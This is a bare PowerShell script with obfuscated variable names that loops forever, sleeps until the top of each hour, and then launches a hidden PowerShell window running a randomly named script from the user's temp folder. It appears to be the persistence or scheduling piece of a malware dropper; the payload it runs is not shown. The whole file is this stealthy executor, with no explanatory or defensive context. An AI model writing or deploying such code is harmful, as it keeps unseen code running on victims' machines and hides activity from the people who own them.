$sXVBOreRmL = @(
    '00:00:00',
    '01:00:00',
    '02:00:00',
    '03:00:00',
    '04:00:00',
    '05:00:00',
    '06:00:00',
    '07:00:00',
    '08:00:00',
    '09:00:00',
    '10:00:00',
    '11:00:00',
    '12:00:00',
    '13:00:00',
    '14:00:00',
    '15:00:00',
    '16:00:00',
    '17:00:00',
    '18:00:00',
    '19:00:00',
    '20:00:00',
    '21:00:00',
    '22:00:00',
    '23:00:00'
)

$sXVBOreRmL = $sXVBOreRmL | Sort-Object
while ($true) {
    foreach ($HFXRGQSqlP in $sXVBOreRmL)
    {
        if((Get-Date) -lt (Get-Date -Date $HFXRGQSqlP))
        {
            while ((Get-Date -Date $HFXRGQSqlP) -gt (Get-Date))
            {
              (Get-Date -Date $HFXRGQSqlP) - (Get-Date) | Start-Sleep
            }
            powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/KHRgMHYmdT.ps1"
        }
    }
}